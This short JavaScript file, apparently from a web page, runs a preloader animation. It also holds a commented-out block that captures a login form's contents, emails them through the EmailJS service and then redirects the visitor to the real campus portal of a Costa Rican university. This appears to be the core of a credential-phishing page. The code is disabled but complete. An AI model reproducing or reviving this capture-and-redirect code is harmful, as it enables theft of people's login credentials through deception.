/* document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    emailjs.sendForm("default_service","template_2grx5am", this)
    .then(() =>{
        window.location.href = "https://campus.ulatina.ac.cr/";
    }, function (error) {
        console.error('Error al enviar el correo electrónico:', error);
    });
}); */




document.addEventListener("DOMContentLoaded", function () {
    setTimeout(function () {
        document.getElementById("preloader").style.transform = "translate3d(0, 0, 0)";
    }, 1000);

    const progressBar = document.getElementById("progress-bar");
 
    progressBar.addEventListener("animationend", function () {
        preloader.style.display = "none";
    });
});


